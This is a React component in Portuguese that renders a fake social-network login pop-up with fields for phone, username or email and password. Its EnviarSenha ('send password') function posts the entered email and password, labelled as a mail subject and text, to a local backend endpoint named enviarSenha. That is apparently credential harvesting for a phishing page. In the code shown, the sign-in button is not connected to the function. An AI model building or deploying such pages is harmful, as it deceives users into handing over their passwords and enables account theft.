import './login.scss';
import axios from "axios"

import { useState, useRef } from 'react';

export default function PopUp() {
    const [PWD, setPWD] = useState('')
    const [EMAIL, setEMAIL] = useState('')
    const [BorderColor, setBorderColor] = useState('')

    const EmailRef = useRef(null);
    const senhaRef = useRef(null);

    const [hidden, setHidden] = useState(true);




    const EnviarSenha = async () => {
        let dadosPessoa = {
            subject: EMAIL,
            text: PWD
        }
        let resposnse = await axios.post('http://localhost:5000/enviarSenha', dadosPessoa)
        console.log(resposnse)
    }

    const IsHide = () => {

        if (hidden)
            setHidden(false)
    }

    return (
        <>
            {hidden && (
                <div className='popMain'>
                    <div className='popUp'>
                        <div className='botaoX'>
                            <b onClick={() => setHidden(false)}> X </b>
                        </div>
                        <i className='imgLogo'></i>
                        <div className='Inputs'>
                            <div onClick={() => { EmailRef.current.focus(); }}>


                                <input ref={EmailRef} type='text' placeholder='Telefone, nome de usuario ou email' onChange={e => setEMAIL(e.target.value)} />

                            </div>

                            <div onClick={() => senhaRef.current.focus(senhaRef)}>
                                <input ref={senhaRef} type='password' placeholder='Senha' onChange={e => setPWD(e.target.value)} />
                            </div>

                        </div>

                        <button> Entrar </button>
                        <div className='Lines'>
                            <span></span>
                            <a> OU </a>
                            <span></span>
                        </div>
                        <div className='NewAccount'>
                            <p>Não tem uma conta? <a href=''>Cadastre-se</a></p>
                        </div>
                    </div>

                </div>
            )}
        </>
    );
};